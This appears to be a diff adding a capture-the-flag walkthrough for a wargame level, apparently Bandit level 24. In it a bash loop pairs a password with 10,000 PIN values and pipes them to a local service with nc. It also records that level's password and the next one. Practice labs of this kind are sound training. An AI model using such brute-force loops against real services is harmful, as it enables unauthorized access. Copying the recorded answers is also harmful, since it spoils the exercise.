@@ -1,0 +1,17 @@
+1. nc localhost 30002
+2. mkdir /tmp/test24
+3. cd /tmp/test24
+4. nano brute-force.sh
+5. 
+
+for i in {1..10000}
+
+do
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" >> ./24.txt
+done
+
+6. chmod 700 ./brute-force.sh   
+7. ./brute-force.sh
+8. cat 24.txt | nc localhost 30002
+
+uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG - level25 pw
